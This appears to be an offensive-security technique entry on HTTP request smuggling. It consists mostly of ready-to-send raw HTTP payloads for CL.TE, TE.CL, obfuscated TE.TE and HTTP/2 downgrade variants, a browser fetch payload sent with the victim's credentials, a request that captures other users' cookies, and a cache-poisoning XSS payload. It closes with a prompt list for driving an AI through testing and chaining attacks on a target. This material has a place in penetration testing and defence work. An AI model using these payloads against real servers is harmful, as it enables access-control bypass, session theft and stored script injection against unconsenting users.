---
id: "http-request-smuggling"
title: "HTTP Request Smuggling - CL.TE, TE.CL, H2, Browser-Powered"
type: "technique"
category: "web-application"
subcategory: "deserialization"
tags: ["request-smuggling", "http", "cl-te", "te-cl", "http2", "desync", "cache-poisoning", "portswigger"]
difficulty: "expert"
platforms: ["linux", "macos", "windows"]
related: ["cache-poisoning", "ssrf-techniques"]
updated: "2026-03-30"
---

## Overview

HTTP request smuggling exploits discrepancies between how front-end (CDN/proxy/WAF) and back-end servers parse HTTP request boundaries. By sending ambiguous requests, attackers can "smuggle" a hidden request that gets processed as a separate request on the back-end. Impact: bypass WAFs, hijack other users' requests, poison caches, escalate to account takeover. James Kettle (PortSwigger) earned $200k+ in bounties from smuggling in two weeks.

## CL.TE (Content-Length vs Transfer-Encoding)

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end forwards 13 bytes (including `0\r\n\r\nSMUGGLED`). The back-end sees the chunked `0` terminator and treats `SMUGGLED` as the start of the next request.

### Exploit — bypass front-end access control
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=
```

## TE.CL (Transfer-Encoding vs Content-Length)

Front-end uses `Transfer-Encoding: chunked`, back-end uses `Content-Length`.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## TE.TE (Obfuscated Transfer-Encoding)

Both servers support chunked, but one can be tricked into ignoring it with obfuscation.

```http
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked\r\n\t
Transfer-Encoding:
 chunked
X: X\nTransfer-Encoding: chunked
Transfer-Encoding
: chunked
```

## HTTP/2 Smuggling (H2.CL / H2.TE)

HTTP/2 downgrades to HTTP/1.1 at the reverse proxy, enabling new smuggling vectors.

### H2.CL — inject Content-Length in HTTP/2
```
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

```

### H2.TE — inject Transfer-Encoding in HTTP/2
```
:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```

### CRLF injection in HTTP/2 headers
```
:method: POST
:path: /
:authority: target.com
foo: bar\r\nTransfer-Encoding: chunked
```

## Browser-Powered Smuggling

Trick a victim's browser into issuing a smuggling attack via fetch/XHR.

```javascript
// CL.0 — Content-Length body ignored by back-end for GET-like methods
fetch('https://target.com/', {
    method: 'POST',
    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
    mode: 'no-cors',
    credentials: 'include'
});
```

## Smuggling to Capture Other Users' Requests

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 244
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

data=
```

The next legitimate user's request (with their cookies/auth headers) gets appended to the `data=` parameter and sent to `/log`.

## Smuggling to Poison Cache

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
Content-Length: 10

x=<script>alert(1)</script>
```

The cache stores the poisoned response for `/static/main.js`, serving XSS to all users.

## Detection

```bash
# Burp Suite — HTTP Request Smuggler extension (automated)
# Turbo Intruder — timing-based detection

# Manual CL.TE detection
# Send request with CL that includes smuggled prefix
# If the smuggled prefix causes a 404 or different response on the NEXT request, it's vulnerable

# Timing detection
# CL.TE: if back-end times out waiting for chunked terminator, it's using TE
# TE.CL: if front-end times out, it's using TE
```

## Deep Dig Prompts

```
Given this target [CDN/proxy info, HTTP version support]:
1. Identify the front-end and back-end technology.
2. Test CL.TE, TE.CL, and TE.TE obfuscation variants.
3. Check for HTTP/2 downgrade smuggling (H2.CL, H2.TE, CRLF in headers).
4. If smuggling works, chain with: cache poisoning, request hijacking, or WAF bypass.
5. Test CL.0 for browser-powered smuggling potential.
```

## Tools

- **HTTP Request Smuggler** — Burp extension by James Kettle
- **smuggler.py** — Automated smuggling detection
- **h2csmuggler** — HTTP/2 cleartext smuggling
- **Turbo Intruder** — Timing-based detection
